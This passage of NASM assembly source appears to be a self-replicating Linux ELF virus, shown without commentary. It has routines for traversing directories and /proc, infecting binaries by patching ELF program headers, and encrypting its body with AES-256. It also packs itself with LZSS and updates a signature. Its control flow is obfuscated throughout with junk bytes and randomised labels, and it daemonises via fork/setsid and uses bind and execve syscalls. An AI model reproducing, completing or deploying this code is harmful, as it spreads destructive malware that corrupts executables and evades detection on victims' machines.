    jge         ..@RUHGcBAMf4mR
..@k0YEwu3BaFaP:
    cmp         r1, 0x00
    jmp         $+4
db 0x31, 0x4b
    jmp         ..@PJEY0FpisNR3
..@7siLRHOaL098:
    mov         BYTE [r1], 0x00
    jmp         $+5
db 0xef, 0xf9, 0xcb
    jmp         ..@x91ZWyOgFlsh
..@2gJ4F4CqP9v3:
    cmp         BYTE [r1], '/'
    jne         ..@bYBwyrVMkoY7
    jmp         $+3
db 0x75
    jmp         $+5
db 0x3a, 0x72, 0xda
    jmp         $+3
db 0x52
    jmp         ..@TTnfc5i6KHBu
..@5FlHrtkExooI:
    mov         ecx, PADDING
    jmp         $+5
db 0x14, 0x76, 0x77
    jb          ..@GGNJT1FonyDI
    jae         ..@GGNJT1FonyDI
..@sKglIs5nMNS5:
%ifdef X86_32
    mov         eax, SYS_MMAP2
    int         0x80
%endif
    jmp         ..@LgkSukGibuol
..@aD8a0wBUvMwx:
    jle         ..@JzUHM2gKJgQm
    jmp         ..@jlruGh2Nm2EC
..@OluxxF5ZuoOI:
    mov         r2, r1
    add         r2, e_h.e_shoff
    add         r1, QWORD [r2]
    jmp         $+3
db 0x1f
    jl          ..@WBOF99HySOIC
    jge         ..@WBOF99HySOIC
..@q54VWwCXIqXu:
    VAR         packed, procdir
    jmp         ..@znk6N6opzx4s
..@OR4ZbyReFzFj:
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    js          ..@bBhVSLY7hHTp
    jns         ..@bBhVSLY7hHTp
..@txbMWFOvWlk3:
    VAR         packed, status
    je          ..@rv6IY8jcLHyW
    jne         ..@rv6IY8jcLHyW
..@Wv8E0DLd3QaH:
    mov         m7, rdi
    js          ..@5iXHD90CKL3l
    jns         ..@5iXHD90CKL3l
..@4FLbNgeTwHyr:
    pop         r1
    ret
    jmp         $+5
db 0x53, 0x37, 0x30
    jmp         DYNPIEValidation
..@uP5sOIN9kNji:
    jnz         ..@ByeErte1WBwT
    je          ..@XS7E8ArKRG6G
    jne         ..@XS7E8ArKRG6G
..@6ZhsDdzuCWIe:
    xor         rax, rax
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r5+file.filesize]
    jb          ..@lzrDxj6qTLfB
    jae         ..@lzrDxj6qTLfB
..@9EZ4PsXPjqTU:
    add         rsp, 0x100
    jmp         $+5
db 0x45, 0x61, 0x5b
    je          ..@LEqigQXne6r3
    jne         ..@LEqigQXne6r3
..@enC9GafdQfms:
    jmp         ..@iUaD78RveJ6I
    jmp         $+5
db 0x2a, 0x6d, 0xd0
    jmp         ..@XdnumjtPN1Lh
..@DTgPxYKKIUC4:
    jl          ..@1akUl7sSnYSx
    jmp         $+4
db 0x5f, 0x21
    jmp         ..@zDBssteI2QpX
..@LR5OpfgsLB9Z:
    sub         rsi, m6
    mov         DWORD [rdi], esi
    jb          ..@K7jeTnO6ApTV
    jae         ..@K7jeTnO6ApTV
..@q8sbhoSWOXbr:
    add         r5, rax
    jmp         $+4
db 0xe4, 0xcd
    jl          ..@xadAPfonX6Gt
    jge         ..@xadAPfonX6Gt
..@ZE5uZVA1Y0jt:
    shl         edi, 0x8
    jmp         $+4
db 0x5a, 0x56
    js          ..@l3ypxVgUijMH
    jns         ..@l3ypxVgUijMH
..@AXVEgBOKlsP9:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+3
db 0x44
    js          ..@toFnC4VnBGTY
    jns         ..@toFnC4VnBGTY
..@7fO5EnKX2Cwh:
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    jb          ..@2nTv5oTaEbb3
    jae         ..@2nTv5oTaEbb3
..@kY24iBmBNfPF:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_EXECVE
%endif
    jmp         ..@hyAvOBC2gnFP
..@ks8PjWy8qW5y:
    xor         rax, rax
    jmp         ..@JMVhz0PJheBO
..@znk6N6opzx4s:
    mov         QWORD [rsp+_PROC_OFF.dirname], r5
    mov         r1, r5
    jmp         $+3
db 0xb2
    jl          ..@3zm7FRv5UzZ0
    jge         ..@3zm7FRv5UzZ0
..@UINi9OkhhnU6:
    xor         rax, rax
    js          ..@5HYdVdvywJe3
    jns         ..@5HYdVdvywJe3
..@2XMGH6eXXuI3:
    call        MapFile
    cmp         rax, 0
    jl          ..@sM5iK2wBMaen
    jge         ..@sM5iK2wBMaen
..@ZL2nPGqFV5LL:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         $+4
db 0x60, 0x84
    jmp         $+3
db 0x30
    jmp         ..@uYKfjvOfaG7K
..@55CfYajl7yup:
    call        InfectDirectory
    jmp         ..@sKkgUgekvBJV
..@BqWbr7cnSCdi:
%ifdef X86_32
    mov         edi, r1
%endif
    jmp         $+5
db 0x31, 0x46, 0xc7
    jmp         $+4
db 0x23, 0x6e
    jmp         $+3
db 0xb7
    jmp         ..@pw8FrdatDLbj
..@4vIZAiRYPVLW:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    js          ..@8ODzGdM4iqx5
    jns         ..@8ODzGdM4iqx5
..@VJeEIuEaTg6z:
    shr         edx, 1
    je          ..@u7TLfyjAFNOY
    jne         ..@u7TLfyjAFNOY
..@wfsUjED5Fr04:
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         ..@ZL2nPGqFV5LL
..@ziZYb919ufkL:
    mov         r5, r3
    jmp         $+3
db 0x92
    jb          ..@TGZM89SUlhFW
    jae         ..@TGZM89SUlhFW
..@MKHj5fvB528g:
    lea         r3, [rsp+_NBF_OFF.key]
    call        Aes256Encryption
    mov         r1, [rsp+_NBF_OFF.file]
    jmp         $+4
db 0x8d, 0x19
    js          ..@ZiZs9QUkpk6j
    jns         ..@ZiZs9QUkpk6j
..@ljwPBZNIprLM:
    xor         rax, rax
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    jl          ..@FF2TbSPbDg1y
    jge         ..@FF2TbSPbDg1y
..@KmuyI8ZfoViH:
    mov         QWORD [rsp+_NBF_OFF.file], r1
    jmp         $+4
db 0x47, 0xcf
    jmp         $+4
db 0xd4, 0x1d
    jmp         ..@ys8h4brPPlOE
..@PwfaFVMyXdYE:
    jmp         ..@WXBq7ncNMCUb
    jb          ..@oXrCgCFuzwqN
    jae         ..@oXrCgCFuzwqN
..@iYqFMcfWnv36:
    pop         r4
    jmp         $+3
db 0x29
    jmp         ..@1cBKUgg6w9Eh
..@zpbCSuwe9srt:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jb          InfectionRoutine
    jae         InfectionRoutine
..@gMdfoIlYoobW:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
    call_vsp    ExitProgram
%endif
    jmp         $+4
db 0xc1, 0x25
    jmp         ..@tmRZXexByYrm
..@ffNohZIcOSDo:
    push        rbp
    mov         rbp, rsp
    jl          ..@rvirAYDBeS7K
    jge         ..@rvirAYDBeS7K
..@jKJAzX7nW3ib:
    mov         r1, r5
    js          ..@f1fI73boVJPS
    jns         ..@f1fI73boVJPS
..@rrhxweEtkNJB:
    jl          ..@0tAnTu0ltS2G
    jmp         $+3
db 0x0b
    jmp         $+3
db 0x55
    jmp         $+5
db 0x98, 0x2b, 0x03
    jmp         ..@wte2Cxsn0nqc
..@pS11hW4okJrk:
    mov         r1, m6
    add         r1, non_encrypted_len
    jmp         $+3
db 0x93
    jmp         $+3
db 0xac
    jmp         ..@NDyewVNcFu7v
..@2nTv5oTaEbb3:
    mov         r3d, DWORD [rsp+_NBF_OFF.key]
    jmp         $+3
db 0x14
    jmp         $+3
db 0xc2
    jmp         ..@96bboz0tcOzr
NonBinaryFile:
    jmp         ..@Niw5VSAqlBV9
..@12H1ZlHUrWDB:
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    jmp         $+3
db 0x2f
    js          ..@TWucxZHmbYhg
    jns         ..@TWucxZHmbYhg
..@4EaOBD3Z5vyk:
    call        Strcpy
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        Strcpy
    jmp         $+3
db 0x73
    jl          ..@txbMWFOvWlk3
    jge         ..@txbMWFOvWlk3
..@rvYbOufgvgPw:
    push        rbp
    mov         rbp, [rbp]
    call_vsp    Aes256KeyExpansion
    js          ..@RJVDwzRV7ytf
    jns         ..@RJVDwzRV7ytf
..@o6WsNbpb5d3H:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_BIND
%endif
    jb          ..@4vIZAiRYPVLW
    jae         ..@4vIZAiRYPVLW
..@ns6TC0XGEGV3:
    mov         r2, m6
    add         r2, _virus-_start
    jl          ..@7DH523LGHjXk
    jge         ..@7DH523LGHjXk
..@sKkgUgekvBJV:
    xor         r1, r1
    jmp         $+3
db 0x8c
    jb          ..@p9Cw54kxPSbr
    jae         ..@p9Cw54kxPSbr
..@MnTQiLREi0bM:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
    xor         r5, r5
%endif
    jb          ..@lRq42zc65ooY
    jae         ..@lRq42zc65ooY
..@mnx3jmG7x3l1:
    add         rsp, _PAYLOAD_OFF_size
    jmp         $+4
db 0xff, 0x12
    jmp         $+4
db 0x9e, 0x5d
    jmp         ..@JxMDeCzQzwSi
..@3zm7FRv5UzZ0:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jmp         $+4
db 0x2b, 0x7e
    jmp         $+5
db 0x5c, 0x7c, 0x76
    jl          ..@rQzqN4iP1TWH
    jge         ..@rQzqN4iP1TWH
..@OuIUNiAJ1KRT:
    call_vsp    Strlen
    jl          ..@q8sbhoSWOXbr
    jge         ..@q8sbhoSWOXbr
..@mS4ulNVPwumd:
    sub         r2, 1
    jmp         $+4
db 0xf0, 0x9a
    jmp         ..@OPZvrfxrkDLD
..@8sc3kvuGT1KA:
    sub         rsp, _KEYGEN_OFF_size
    jb          ..@LRgfulRz9LJY
    jae         ..@LRgfulRz9LJY
..@q9t6AEdf2ugF:
    sub         rsp, _INFFILE_OFF_size
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+3
db 0x55
    jmp         ..@nnRX4QlFPhKo
..@IcFiH2YmfJeS:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+4
db 0x0b, 0x07
    jmp         ..@2XpQWB5dOuTX
..@FLpKYqDEEr1F:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+3
db 0x9a
    jmp         ..@axKVy29EVxj8
..@NqzBTsrvPBy1:
    cmp         rax, 0x01
    jl          ..@dg7yK8r9l0ph
    jge         ..@dg7yK8r9l0ph
..@mFYpsCGVqVQX:
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    add         r2, 1
    call        InfectDirectory
    jmp         $+3
db 0xd8
    jmp         $+4
db 0x59, 0x2b
    jmp         ..@n9EpzNSWy045
..@pRqdxtbGD4wD:
    or          bx, dx
    jb          ..@2JWkyf69HcLc
    jae         ..@2JWkyf69HcLc
..@ehGEMCkeA72T:
    xor         rax, rax
    jmp         $+4
db 0x71, 0x0f
    jb          ..@aoXbmZvLqLzn
    jae         ..@aoXbmZvLqLzn
..@A3CD3lQZQvuJ:
    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    jmp         $+3
db 0x14
    js          ..@1uZn5VwGW8Ta
    jns         ..@1uZn5VwGW8Ta
..@V2710m4Q9QJj:
    je          ..@TzMiHwPPJbqm
    cmp         BYTE [r1+16], ET_DYN
    je          ..@ApIknvEJwJIw
    jl          ..@FbQeVpoWJ7y4
    jge         ..@FbQeVpoWJ7y4
..@sn9raep3hdTF:
    sub         rsp, 0x100
    push        0x00
    jmp         $+5
db 0x94, 0x38, 0x20
    jmp         $+5
db 0x1e, 0x37, 0x27
    jl          ..@5ilLYS2I5M9a
    jge         ..@5ilLYS2I5M9a
FileValidation:
    jmp         ..@dPtRLJLMCA2M
..@gJDFpLRM4J0o:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    js          ..@OYbPqaIvS9iU
    jns         ..@OYbPqaIvS9iU
..@0UcbLqfzT2lB:
    and         rsp, 0xfffffffffffffff0
    mov         QWORD [rsp+_AESE_OFF.startaddr], r1
    jmp         $+4
db 0xe4, 0x10
    jmp         $+3
db 0xaa
    jb          ..@Z1lvSyiJrOB1
    jae         ..@Z1lvSyiJrOB1
..@PC9wVMOh854w:
    xor         rbx, rbx
    jmp         $+3
db 0x21
    jmp         ..@ihnflMXV2ZVH
..@ktykqFK55Fp7:
    mov         BYTE [r1], '/'
    jmp         $+3
db 0xfd
    jmp         $+3
db 0x8f
    jmp         ..@KvSluw9669gA
..@Q7WJAqdBMYZ4:
    aesenc      xmm0, xmm1
    jmp         ..@MiHjpKL09U0o
..@LizvnCKaACGN:
    mov         r3, original_virus_len-non_packed_len
    call        MemMove
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    jmp         $+3
db 0xa7
    jmp         $+4
db 0xc6, 0x70
    jmp         $+4
db 0x7a, 0xc8
    jmp         ..@bIll4HF32IDC
..@EA2a5WxLRoZM:
    call        Strcpy
    jmp         ..@ktykqFK55Fp7
..@XOaPelqWKd8Y:
%ifndef ENABLE_DEBUGGING
    mov         r2, r5
%endif
    jl          ..@68EhVH2jX8nb
    jge         ..@68EhVH2jX8nb
..@kDMOcmR31cSm:
%ifndef ENABLE_DEBUGGING
    mov         eax, SYS_SETSID
    syscall
    mov         rax, SYS_FORK
%endif
    jmp         ..@23fM2yn3E3hW
..@15pKed6QuU9u:
    test        r2, r2
    jmp         $+4
db 0x7a, 0x08
    js          ..@EaWW4jerRhGz
    jns         ..@EaWW4jerRhGz
Aes256Encryption:
    jmp         ..@ffNohZIcOSDo
..@vip4BsrCkRzq:
    push        r4
    jmp         $+3
db 0x75
    jmp         $+3
db 0x98
    jmp         ..@ut6R1XztP6B8
..@EXIkV2ejR5gj:
    cmp         al, 0xa
    jl          ..@zw1ffNvtsDdO
    js          ..@uKychaaTbWIW
    jns         ..@uKychaaTbWIW
..@BxmYLQFD1m8c:
    jne         ..@LYuICe0K3Bpc
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    call        IsNum
    jmp         $+4
db 0x68, 0x87
    jmp         $+3
db 0x31
    jmp         ..@CVbpashMPDkM
..@bAXQYgST3b2n:
    mov         rdi, QWORD [rsp+_AESE_OFF.keyaddr]
    jmp         $+4
db 0x18, 0xb2
    jmp         ..@rvYbOufgvgPw
..@u7TLfyjAFNOY:
    test        edx, edx
    jnz         ..@kUzayClRhg3e
    jmp         ..@Fd6hHAgyoyyA
    jmp         ..@Fd6hHAgyoyyA
..@KVxYCpanV1V3:
    sub         r5, 1
    jmp         $+5
db 0x5b, 0x01, 0xf2
    jl          ..@PHQvbSsP92QI
    jge         ..@PHQvbSsP92QI
..@pUr94PuFzzy9:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    jmp         $+3
db 0xe0
    jmp         $+4
db 0xc5, 0x35
    jmp         $+3
db 0xaa
    jl          ..@r3otnGackPjn
    jge         ..@r3otnGackPjn
..@w3BIvcpTd9NM:
    cmp         rax, 0
    jne         ..@PNBnYJNEowRv
    jmp         ..@PxNIl5NbLF5s
..@GPxEUlACx9hI:
    mov         rax, SYS_FORK
    syscall
    test        eax, eax
    jmp         ..@HFIkxEVCcTO4
..@RBze8rGWbeK9:
    jnz         ..@5V6OC7Le1QBK
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x9d
    js          ..@Wuzn7tCQgJ5A
    jns         ..@Wuzn7tCQgJ5A
..@OeFllZ9PjTUb:
    pop         r2
    cmp         rax, 0x00
    jle         ..@iUaD78RveJ6I
    js          ..@ziZYb919ufkL
    jns         ..@ziZYb919ufkL
..@ISd686tiOj4c:
    mov         r1, r4
    mov         rax, [r5+file.filesize]
    add         rax, r2
    jl          ..@ruMI8papFzub
    jge         ..@ruMI8papFzub
..@kUzayClRhg3e:
    mov         eax, ebx
    and         eax, edx
    test        eax, eax
    jb          ..@uP5sOIN9kNji
    jae         ..@uP5sOIN9kNji
..@GKxSo6Nm2dqa:
%ifdef X86_64
    mov         r8d, DWORD [r8+file.filefd]
    mov         eax, SYS_MMAP
%endif
    jl          ..@VwoSnCACBlyg
    jge         ..@VwoSnCACBlyg
..@sKdTTixmqiEL:
    mov         r2, 11b
    jmp         ..@2XMGH6eXXuI3
..@RJPqX7B5Tf2R:
    mov         r2, [rsp+_PROC_OFF.dirname]
    jmp         $+5
db 0x3f, 0x38, 0xd9
    jmp         ..@4EaOBD3Z5vyk
..@73hdwgDD4gAw:
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    mov         QWORD [r2+p_h.p_offset], r3
    push        r2
    jmp         $+3
db 0x65
    jmp         $+4
db 0x20, 0xfc
    jl          ..@m7LMEZ47O9MO
    jge         ..@m7LMEZ47O9MO
..@sZe8BXadEOzV:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+3
db 0x7d
    jb          ..@XvDUIbVmBgjZ
    jae         ..@XvDUIbVmBgjZ
..@t0WbCroNHGvz:
    jle         ..@Sk7hy1eOe4M2
    jmp         $+5
db 0x86, 0xa1, 0x05
    jl          ..@QdSyOpKXh3aT
    jge         ..@QdSyOpKXh3aT
..@aw5E0PEu2mSh:
    jmp         ..@OPZvrfxrkDLD
    jmp         $+5
db 0x8a, 0xcc, 0x79
    jmp         $+5
db 0xde, 0x15, 0x4b
    jmp         ..@pUr94PuFzzy9
..@kCEhUyuLxwm5:
    pop         r4
    ret
    jmp         UnmapFile
..@FKfO3d2JWzB0:
    mov         r5, [rsp]
    js          ..@5plVRwh7Vfng
    jns         ..@5plVRwh7Vfng
..@imZViklUcrxn:
    call_vsp    Aes256KeyCreation
    jmp         $+4
db 0xf9, 0xbe
    jl          ..@pS11hW4okJrk
    jge         ..@pS11hW4okJrk
..@dHlgbbMMngiN:
%ifndef ENABLE_DEBUGGING
    jz          ..@nux2xcWZtIDT
%endif
    jmp         $+5
db 0x66, 0x78, 0xc8
    jmp         ..@Q9QRksCmtr6t
..@TxA4xx7jqOJz:
    mov         r1, r5
    add         r1, r4
    jmp         $+5
db 0x28, 0x3f, 0x98
    jmp         $+4
db 0x4d, 0x3e
    jmp         $+5
db 0xd4, 0x5f, 0x51
    jmp         $+5
db 0x5d, 0x42, 0xa6
    jb          ..@MkOcKoVlldpi
    jae         ..@MkOcKoVlldpi
..@0H25Tptoz0v1:
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    add         r4, rax
    jmp         ..@W8woZcJ5namE
..@GgHCPNTqFBp9:
%ifndef ENABLE_DEBUGGING
    syscall
    cmp         rax, 0x0
    jl          ..@gMdfoIlYoobW
%endif
    jmp         $+3
db 0x08
    js          ..@sYlyYSyAk0lo
    jns         ..@sYlyYSyAk0lo
..@VqJ3Dt8DmJzD:
    ret
    jmp         $+5
db 0x68, 0xca, 0xc4
    jl          InfectFile
    jge         InfectFile
..@AJOCTJrV4LR8:
    mov         r1, QWORD [r5+file.fileptr]
    add         r1, signature_len-1
    jmp         $+4
db 0xa8, 0x63
    jmp         $+3
db 0x6f
    jmp         ..@7siLRHOaL098
..@FgBPoCjp9i3H:
    cmp         r1, e_h_size
    jmp         ..@keYjBNXVMdwe
..@nEvowVDnFcKk:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
    xor         r3, r3
%endif
    js          ..@EFwCmnxaNGDk
    jns         ..@EFwCmnxaNGDk
..@veuOBaGI7J81:
    syscall
    cmp         eax, 0x0
    jmp         ..@oUAhJTXeyMCy
..@QSUvwfFIZ9C4:
    pop         r4
    jmp         $+5
db 0xfe, 0xa6, 0x0a
    js          ..@q1NYVcJ9H3DV
    jns         ..@q1NYVcJ9H3DV
..@HoC4IJJRFye6:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+3
db 0xb4
    jmp         ..@pG8LS2prWnzg
..@8HT5ZQuiELPw:
    push        r4
    push        r3
    push        r2
    jmp         $+4
db 0x76, 0x43
    jmp         $+4
db 0x9e, 0xa0
    jmp         $+3
db 0x37
    jl          ..@0nJSn71GvLdu
    jge         ..@0nJSn71GvLdu
..@ZiZs9QUkpk6j:
    mov         r2, signature_len
    call        AddSizeMappedFile
    jmp         $+3
db 0x4e
    jb          ..@ijXWS2PmNgTQ
    jae         ..@ijXWS2PmNgTQ
..@RUHGcBAMf4mR:
    je          ..@iUaD78RveJ6I
    mov         r4, m7
    sub         r4, m6
    jmp         $+4
db 0xcb, 0x07
    jl          ..@s4F9BZ9eUsLA
    jge         ..@s4F9BZ9eUsLA
..@jS6rOObOLQha:
    je          ..@bYBwyrVMkoY7
    jmp         ..@QtJCNblwH9Ce
..@o0wv5cL6f8OJ:
    and         r2, 1b
    jmp         $+3
db 0xa5
    jmp         $+5
db 0x74, 0xf3, 0x12
    jmp         $+3
db 0x12
    je          ..@jUhbzrTBPzgU
    jne         ..@jUhbzrTBPzgU
..@4bHRIkrc6R1U:
    call        MemMove
    mov         rcx, signature_len
    jmp         $+3
db 0x6a
    js          ..@84RYeE8cWOQW
    jns         ..@84RYeE8cWOQW
..@68EhVH2jX8nb:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_PRCTL
    xor         r3, r3
%endif
    jmp         $+4
db 0xca, 0x33
    jmp         $+4
db 0xbe, 0x9b
    jmp         $+3
db 0xdb
    js          ..@MnTQiLREi0bM
    jns         ..@MnTQiLREi0bM
..@nLyZQ4pJGaQv:
    VAR         packed, procs
    jmp         ..@TxA4xx7jqOJz
..@UHd7JOZ9SmJd:
    mov         QWORD [r2+p_h.p_filesz], r4
    jb          ..@JSHnKavrijT8
    jae         ..@JSHnKavrijT8
..@l0CgLpY5ZTSi:
    mov         ax, WORD [r1]
    jmp         ..@2p0peLBtZCKA
WORDToDWORDASCII:
    jmp         ..@DWEp15X0QKg5
..@sA6Q4ORuiUc0:
    mov         r2, QWORD [r1+e_h.e_phoff]
    add         r2, r1
    xor         r4, r4
    jmp         $+5
db 0x87, 0xaf, 0x78
    jmp         $+3
db 0xa5
    jb          ..@WXBq7ncNMCUb
    jae         ..@WXBq7ncNMCUb
..@g6iOuwe3UEvK:
    call_vsp    Strncmp
    jl          ..@jsWzDGWNXoJP
    jge         ..@jsWzDGWNXoJP
..@sAoDzVPPxsKt:
    ret
    jmp         KeyGen
..@tmRZXexByYrm:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
%endif
    jb          ..@nEvowVDnFcKk
    jae         ..@nEvowVDnFcKk
..@9GNAMz7532ZD:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    js          ..@WhULtkXr0I47
    jns         ..@WhULtkXr0I47
..@6SNcD7e20iLY:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    jmp         $+3
db 0xe9
    jb          ..@jcjeTn6XFT8Q
    jae         ..@jcjeTn6XFT8Q
..@7QjHczcCGNvI:
    add         r1, _signature-_start
    jmp         ..@cALcSZpyJMbC
..@7pZGElN4FBdz:
    add         rdi, rbx
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    jb          ..@52BghsqlH2Jm
    jae         ..@52BghsqlH2Jm
..@a5hPZz6MxmaO:
    cmp         BYTE [r1], 0x30
    jl          ..@Nojq44te8b2h
    cmp         BYTE [r1], 0x39
    jmp         $+3
db 0x4b
    jb          ..@FIBvSMhpI30V
    jae         ..@FIBvSMhpI30V
..@0tBoKoGv3onJ:
    xor         rcx, rcx
    jmp         ..@h5jCjhf3R3Or
..@ypeVJ8je7VDG:
    je          ..@mnx3jmG7x3l1
    xor         r3, r3
    jmp         $+4
db 0x55, 0xf2
    jmp         ..@cFR4TyIMxWY7
..@ncFMSAD5MxkL:
    test        eax, eax
    js          ..@Tjz5QpOnJmYp
    jns         ..@Tjz5QpOnJmYp
..@96bboz0tcOzr:
    call        UpdateSignature
    jb          ..@AJOCTJrV4LR8
    jae         ..@AJOCTJrV4LR8
..@z2l7iiHDYwWS:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev]
    call        WORDToDWORDASCII
    js          ..@zkkQ1Ui18n6b
    jns         ..@zkkQ1Ui18n6b
KeyGen:
    jmp         ..@7OvMR6pIGdVD
..@Niw5VSAqlBV9:
    sub         rsp, _NBF_OFF_size
    mov         WORD [rsp+_NBF_OFF.index], r2w
    jb          ..@KmuyI8ZfoViH
    jae         ..@KmuyI8ZfoViH
..@sYlyYSyAk0lo:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
%endif
    js          ..@4YGWam9qQO2q
    jns         ..@4YGWam9qQO2q
..@xFBje5Sfiejf:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jmp         $+4
db 0xb6, 0x1f
    jmp         ..@l2HbiBzdQBN3
..@I3e90ChYylnq:
    jl          ..@9EZ4PsXPjqTU
    je          ..@GPxEUlACx9hI
    jmp         $+4
db 0xfe, 0xaf
    jmp         $+5
db 0xec, 0x88, 0x18
    jmp         ..@vRdd0eP2oC9i
..@bY6g2P6Tlbzr:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jl          ..@JJ2MV2v4Y1ja
    jge         ..@JJ2MV2v4Y1ja
..@mtJa9ijWkcwW:
    xor         r4, r4
    jl          ..@nLyZQ4pJGaQv
    jge         ..@nLyZQ4pJGaQv
..@KvSluw9669gA:
    add         r1, 1
    jmp         $+3
db 0x7e
    jmp         ..@gbV5O3R6uNri
..@RyCRrqged7Af:
    cmp         rax, 0
    jmp         ..@VtvsaFeFrJXI
..@pwEsT9P2a0Ko:
    pop         r5
    pop         r4
    jmp         $+4
db 0xa6, 0x85
    jmp         $+5
db 0x2c, 0x01, 0x6b
    jmp         $+5
db 0x30, 0x8a, 0x97
    jl          ..@nQ2WCDo081sb
    jge         ..@nQ2WCDo081sb
..@52BghsqlH2Jm:
    add         rsi, rdx
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jmp         $+5
db 0xe4, 0xb7, 0x84
    jmp         ..@Eim7CQrJGOYU
..@boH1yujloq1f:
    add         rdi, rcx
    add         rsi, rcx
    sub         rdi, 1
    js          ..@O2q2VzW4ln6i
    jns         ..@O2q2VzW4ln6i
..@lTeycR7SxrQW:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    jmp         $+4
db 0x12, 0x68
    jmp         $+5
db 0x53, 0x09, 0x02
    je          ..@o3JERJ4Alg8N
    jne         ..@o3JERJ4Alg8N
..@UcDzNArLAlKl:
    cmp         ax, LOOKAHEAD_LENGTH
    cmovl       dx, ax
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    jl          ..@sZe8BXadEOzV
    jge         ..@sZe8BXadEOzV

_eof:
